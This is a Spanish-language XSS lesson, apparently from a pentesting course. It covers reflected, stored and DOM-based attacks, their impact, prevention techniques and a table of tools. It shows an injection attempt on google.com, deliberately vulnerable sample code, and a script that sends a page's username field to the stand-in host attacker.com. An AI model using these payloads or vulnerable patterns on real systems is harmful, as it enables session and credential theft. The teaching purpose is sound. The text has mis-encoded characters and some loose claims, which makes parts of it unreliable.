---
title: "XSS (secuencias de comandos entre sitios)"
subtitle: "Dominando todo sobre Cross-site scripting"
tags: ["pentesting", "ciberseguridad", "equipo rojo"]
authors: ["blindma1den", "lorenagubaira"]

---

IMPORTANTISIMO! Antes de empezar, XSS es la vulnerabilidad mas importante de todas, esta presente en mas del 40% de los websites. Vamos a prestarle toda la atenci√≥n posible no solo a esta vulnerabilidad sino a todo el OWASP top 10.

![XSS1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss1.png?raw=true)

Cross-site scripting (XSS) es cuando un website tiene entradas de datos no validadas que permiten al atacante injectar codigo HTML, CSS o Javascript dentro de la pagina objetivo. Por ejemplo:

## Atacando Google.com con XSS Reflejado (Reflected XSS).

Si te fijas bien, cuando usas google.com para buscar por ejemplo "Que es XSS" el termino de busqueda que escribiste se suma al URL de la pagina de resultados como un "query string" de la siguiente manera:

```url
https://www.google.com/search?q=ques+es+xss
```

Cualquier combinacion de caracteres que usemos para buscar, pasara a ser parte del URL de los resultados de busqueda y luego pasara a ser parte del `<body>` de la pagina de resultados.

![xss a google.com](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/pentesting-red-team/xss-search-term.jpg?raw=true)

### Injectando scripts a la pagina atacada

Si injectar el texto `"Que es XSS"` a la pagina de google.com, tal vez podemos injectar un script the JS que abra una nueva modal:

```url
https://www.google.com/search?q=<script>alert('Hola Mundo')</script>
```

Hemos logrado que nuestro codigo sea incluido a la pagina de google! [Pincha aqui para comprobarlo](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/pentesting-red-team/xaa-script-attempt.jpg?raw=true).

### Google.com esta protegido en contra de XSS

La mala noticia, es que, a pesar de que nuestro codigo `<script>alert('Hola Mundo')</script>
` aparece dentro del coding fuente de google.com, ¬°No se esta ejecutando!

Seguramente google esta transformando nuestro codigo en caracteres inofensivos para evitar que el navegador web los interprete.

### Ejemplos de scripts mas maliciosos

Un simple `<script>alert('Hola Mundo')</script>` es inofensivo, pero el siguiente script seria mucho pero:

```js
<script>
    window.location = "http://attacker.com/phishing-page?data=" + document.getElementById('username').value;
</script>
```

Este ataque podr√≠a ser utilizado para redirigir a los usuarios a una p√°gina de phishing que parece leg√≠tima pero est√° controlada por el atacante. En el proceso, el atacante podr√≠a robar el nombre de usuario u otra informaci√≥n sensible que el usuario haya introducido en el sitio original. Esto podr√≠a llevar al robo de credenciales o a enga√±ar al usuario para que proporcione m√°s informaci√≥n en la p√°gina de phishing.

#### ¬øQu√© Hace Este C√≥digo?

1. **Etiqueta `<script>`**: El atacante inyecta una etiqueta `<script>` en la p√°gina web. Cuando se carga la p√°gina, el navegador de la v√≠ctima ejecutar√° este script.

2. **Redirecci√≥n Maliciosa**: El script utiliza `window.location` para redirigir al usuario a una URL controlada por el atacante, en este caso, `http://attacker.com/phishing-page`. La parte clave de esta redirecci√≥n es que el script tambi√©n adjunta datos sensibles a la URL.

3. **Robo de Informaci√≥n del Usuario**: El script obtiene el valor del campo de entrada con el ID `username`, que podr√≠a ser el nombre de usuario o alguna otra informaci√≥n sensible que el usuario haya introducido en la p√°gina. Este valor se adjunta a la URL de la p√°gina de phishing y es enviado al servidor del atacante.

## Otros Tipos de XSS

### XSS Almacenado (Stored XSS)

Imagina una red social donde los usuarios pueden publicar comentarios en los perfiles de otros usuarios. Estos comentarios se almacenan en una base de datos y se muestran cada vez que alguien visita el perfil.

**Ejemplo de C√≥digo Vulnerable:**

```php
@app.route('/post_comment', methods=['POST'])
def post_comment():
    comment = request.form['comment']
    comments.append(comment)  # Guardar comentario sin sanitizar
    return "Comentario publicado"

@app.route('/view_comments')
def view_comments():
    comments_html = "".join(f"<p>{comment}</p>" for comment in comments)
    return render_template_string(comments_html)  # Vulnerable a XSS
```

**Ataque:**
Un atacante puede publicar un comentario como el siguiente:

```html
<script>alert('XSS Almacenado');</script>
```

Cuando otros usuarios visiten la p√°gina del perfil, este script se ejecutar√° en sus navegadores, mostrando una alerta o realizando alguna acci√≥n maliciosa.

### 3. **XSS Basado en DOM (DOM-based XSS)**

**Escenario:**
Una p√°gina web utiliza JavaScript para mostrar el contenido de la URL directamente en el DOM, como parte de una funcionalidad que muestra un saludo personalizado.

**Ejemplo de C√≥digo Vulnerable:**

```html
<!-- HTML - C√≥digo que manipula el DOM -->
<!DOCTYPE html>
<html>
<head>
    <title>Bienvenido</title>
</head>
<body>
    <h1>Bienvenido</h1>
    <p id="greeting"></p>
    <script>
        var greeting = "Hola " + window.location.search.substring(1);
        document.getElementById("greeting").innerHTML = greeting;
    </script>
</body>
</html>
```

**Ataque:**
Un atacante podr√≠a enviar un enlace malicioso:

```
http://ejemplo.com/index.html?nombre=<script>alert('XSS DOM');</script>
```

Al abrir esta URL, el navegador de la v√≠ctima ejecutar√° el script malicioso porque el contenido del par√°metro `nombre` se inserta directamente en el DOM sin ser saneado.


## Que puede lograr un atacante con XSS?

Un atacante puede lograr diversas acciones maliciosas a trav√©s de un ataque de Cross-Site Scripting (XSS), dependiendo del tipo de XSS y del contexto en el que se explote la vulnerabilidad. A continuaci√≥n, se enumeran algunas de las acciones m√°s comunes que un atacante podr√≠a llevar a cabo utilizando XSS:

### 1. **Robo de Cookies y Sesiones:**
   - Un atacante puede utilizar XSS para robar cookies de sesi√≥n del usuario, lo que le permite suplantar la identidad de la v√≠ctima en la aplicaci√≥n web. Con las cookies de sesi√≥n, el atacante puede acceder a la cuenta del usuario y realizar acciones como si fuera la v√≠ctima.

### 2. **Desfiguraci√≥n de Sitios Web:**
   - El atacante puede inyectar c√≥digo JavaScript que modifique el contenido visible de la p√°gina web, alterando textos, im√°genes o la estructura de la p√°gina para mostrar mensajes ofensivos o enga√±osos.

### 3. **Redirecci√≥n a Sitios de Phishing:**
   - El atacante puede redirigir a los usuarios a sitios web maliciosos, como p√°ginas de phishing, donde se enga√±a a los usuarios para que introduzcan sus credenciales o informaci√≥n personal.

### 4. **Ejecutar Acciones en Nombre del Usuario (Robo de Clics):**
   - Mediante la manipulaci√≥n de formularios o botones, el atacante puede ejecutar acciones en nombre del usuario, como enviar mensajes, cambiar configuraciones de cuenta, o realizar transacciones no autorizadas.

### 5. **Acceso a Informaci√≥n Sensible:**
   - El script malicioso puede acceder a datos confidenciales en la p√°gina, como contenido de formularios o informaci√≥n de perfil, y enviarla al servidor del atacante.

### 6. **Cargar y Ejecutar C√≥digo Malicioso Externo:**
   - El atacante puede inyectar c√≥digo que carga scripts externos desde un servidor bajo su control, permitiendo la ejecuci√≥n de malware o la explotaci√≥n de otras vulnerabilidades en el navegador del usuario.

### 7. **Keylogging:**
   - A trav√©s de XSS, el atacante puede inyectar un keylogger, un script que registra las pulsaciones de teclas del usuario, capturando contrase√±as, n√∫meros de tarjetas de cr√©dito y cualquier otra informaci√≥n sensible que el usuario escriba.

### 8. **Escalaci√≥n de Privilegios:**
   - Si el atacante puede ejecutar scripts en el contexto del navegador de un usuario con privilegios elevados (por ejemplo, un administrador), puede realizar acciones administrativas o acceder a funciones restringidas de la aplicaci√≥n.

### 9. **Ataques CSRF (Cross-Site Request Forgery):**
   - XSS puede ser utilizado para facilitar ataques CSRF, donde el script malicioso provoca que el navegador del usuario realice solicitudes no deseadas a otra aplicaci√≥n en la que el usuario est√© autenticado.

### 10. **Recolecci√≥n de Informaci√≥n del Entorno del Usuario:**
   - El atacante puede utilizar XSS para obtener informaci√≥n sobre el entorno del usuario, como el tipo de navegador, la versi√≥n del sistema operativo, plugins instalados, direcci√≥n IP, etc., que podr√≠an ser utilizados en ataques dirigidos.

### 11. **Denegaci√≥n de Servicio (DoS):**
   - El atacante puede crear scripts que sobrecarguen la p√°gina web o el navegador del usuario, provocando una Denegaci√≥n de Servicio (DoS) que afecta la disponibilidad de la aplicaci√≥n para el usuario.

## ¬øC√≥mo prevenir XSS?

Evitar ataques de Cross-Site Scripting (XSS) es fundamental para proteger tus aplicaciones web y a tus usuarios. A continuaci√≥n, te presento una serie de pr√°cticas recomendadas para prevenir XSS en tus aplicaciones:

### 1. **Escapar el Contenido HTML**

Escapar todos los datos que se insertan en el HTML antes de renderizarlos en la p√°gina. Esto significa convertir caracteres especiales como `<`, `>`, `&`, y `"` en sus entidades HTML correspondientes.

```python
from flask import escape
safe_string = escape(unsafe_string)
```
```javascript
const escape = require('escape-html');
let safeString = escape(unsafeString);
```

### 2. **Usar Plantillas que Escapan Autom√°ticamente**

Utiliza motores de plantillas que escapan autom√°ticamente el contenido insertado. La mayor√≠a de los frameworks modernos, como Flask (con Jinja2), Django, Laravel (Blade), y Express (con EJS o Pug), escapan el contenido por defecto.

```python
{{ user_input }}
```
```ejs
<%= userInput %>
```

### 3. **Validaci√≥n y Sanitizaci√≥n de Entrada**

Valida y sanitiza la entrada del usuario para asegurarte de que contiene solo lo que esperas. Elimina o codifica cualquier parte que no sea segura.

 ```python
 from wtforms import StringField
 from wtforms.validators import InputRequired, Length

 class MyForm(FlaskForm):
     name = StringField('Name', validators=[InputRequired(), Length(max=100)])
 ```
 ```javascript
 const { body } = require('express-validator');
 
 app.post('/submit', [
     body('username').isAlphanumeric().trim().escape()
 ], (req, res) => {
     // Handle request
 });
 ```

### 4. **Uso de Content Security Policy (CSP)**

Implementa una pol√≠tica de seguridad de contenido (CSP) para limitar las fuentes desde las cuales se pueden cargar scripts. Esto ayuda a mitigar XSS al bloquear la ejecuci√≥n de scripts no autorizados.

**Ejemplo de Cabecera CSP:**
```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://apis.google.com
```

### 5. **Utilizar HTTPOnly y Secure en Cookies**

Aseg√∫rate de que las cookies de sesi√≥n tengan los flags `HttpOnly` y `Secure` para que no puedan ser accedidas por JavaScript ni transmitidas a trav√©s de una conexi√≥n insegura.

```python
response.set_cookie('sessionid', value=session_id, httponly=True, secure=True)
```
```javascript
res.cookie('sessionid', session_id, { httpOnly: true, secure: true });
```

### 6. **Evitar JavaScript Inline y Eventos en HTML**

Evita el uso de c√≥digo JavaScript directamente en etiquetas HTML (`<script>`, `onload=`, `onclick=`, etc.). Usa archivos de scripts externos o declara las funciones en un archivo JS separado.

** üö´ Malo:**
```html
<img src="image.jpg" onerror="alert('XSS')">
```

** ‚úÖ Bueno:**
```html
<img src="image.jpg" id="image">
<script>
    document.getElementById('image').addEventListener('error', function() {
        alert('XSS');
    });
</script>
```

### **Sanitizaci√≥n de HTML en Entradas de Usuario**

Si debes permitir que los usuarios env√≠en HTML (por ejemplo, en un editor de texto enriquecido), usa una biblioteca que sanee el HTML y elimine cualquier c√≥digo peligroso.

```python
from bleach import clean

safe_html = clean(unsafe_html)
```
```javascript
const sanitizeHtml = require('sanitize-html');
let safeHtml = sanitizeHtml(unsafeHtml);
```

## Herramientas para evitar o atacar con XSS

Existen varias herramientas utilizadas por profesionales de la seguridad y atacantes para identificar y explotar vulnerabilidades de Cross-Site Scripting (XSS) en aplicaciones web. Estas herramientas pueden automatizar el proceso de descubrimiento de XSS o facilitar la explotaci√≥n de vulnerabilidades existentes. A continuaci√≥n, se enumeran algunas de las herramientas m√°s conocidas para atacar con XSS:

A continuaci√≥n, te presento una tabla comparativa de las principales herramientas utilizadas para atacar y detectar vulnerabilidades de Cross-Site Scripting (XSS):

| **Herramienta**      | **Descripci√≥n**                                                                 | **Caracter√≠sticas Principales**                                          | **Licencia**      | **Nivel de Complejidad** |
|----------------------|---------------------------------------------------------------------------------|--------------------------------------------------------------------------|-------------------|--------------------------|
| **Burp Suite**       | Herramienta profesional para pruebas de penetraci√≥n en aplicaciones web.        | Escaneo automatizado de XSS, proxy, modificaci√≥n de solicitudes, repeater. | Comercial (versi√≥n gratuita limitada) | Alta                     |
| **OWASP ZAP**        | Herramienta gratuita y de c√≥digo abierto para pruebas de seguridad en aplicaciones web. | Escaneo automatizado de XSS, proxy, fuzzing, y an√°lisis manual.           | Open Source       | Media                     |
| **XSSer**            | Herramienta especializada en la detecci√≥n y explotaci√≥n de vulnerabilidades XSS. | Detecci√≥n y explotaci√≥n de XSS (almacenado, reflejado, DOM), payloads personalizados. | Open Source       | Media                     |
| **BeEF**             | Framework avanzado para la explotaci√≥n de navegadores web comprometidos.        | Control de navegadores v√≠ctimas, ejecuci√≥n de comandos, integraci√≥n con otras herramientas. | Open Source       | Alta                     |
| **XSStrike**         | Herramienta avanzada para an√°lisis, detecci√≥n y explotaci√≥n de XSS.             | An√°lisis de payloads, superaci√≥n de WAFs, escaneo manual y automatizado. | Open Source       | Media                     |
| **SQLMap**           | Herramienta para pruebas de inyecci√≥n SQL con soporte limitado para XSS.        | Escaneo y explotaci√≥n de inyecci√≥n SQL, integraci√≥n con XSS.              | Open Source       | Alta                     |
| **wfuzz**            | Herramienta de fuzzing para pruebas en aplicaciones web, √∫til para encontrar XSS. | Fuzzing de par√°metros, soporte de listas personalizadas (payloads XSS).    | Open Source       | Media                     |
| **Google Dorking**   | T√©cnica de b√∫squeda avanzada en Google para encontrar aplicaciones vulnerables. | B√∫squeda de vulnerabilidades expuestas p√∫blicamente.                      | -                 | Baja                      |

### Resumen de la Tabla:

- **Burp Suite:** Ideal para profesionales de la seguridad que requieren una herramienta completa para pruebas de penetraci√≥n, aunque su versi√≥n gratuita es limitada.
- **OWASP ZAP:** Una alternativa gratuita a Burp Suite, adecuada tanto para principiantes como para expertos.
- **XSSer:** Especializada en XSS, adecuada para quienes buscan detectar y explotar exclusivamente vulnerabilidades XSS.
- **BeEF:** Potente para controlar navegadores comprometidos, ideal para escenarios avanzados de explotaci√≥n.
- **XSStrike:** Herramienta avanzada centrada en la detecci√≥n y superaci√≥n de mecanismos de seguridad relacionados con XSS.
- **SQLMap:** Aunque se centra en inyecci√≥n SQL, tambi√©n ofrece capacidades para explotaci√≥n XSS.
- **wfuzz:** Buena opci√≥n para pruebas de fuzzing en aplicaciones web, incluyendo la detecci√≥n de XSS.
- **Google Dorking:** T√©cnica √∫til para identificar vulnerabilidades XSS expuestas en la web p√∫blica, f√°cil de utilizar.

Cada herramienta tiene sus fortalezas y se adapta a diferentes necesidades y niveles de experiencia, desde principiantes hasta profesionales avanzados en ciberseguridad.
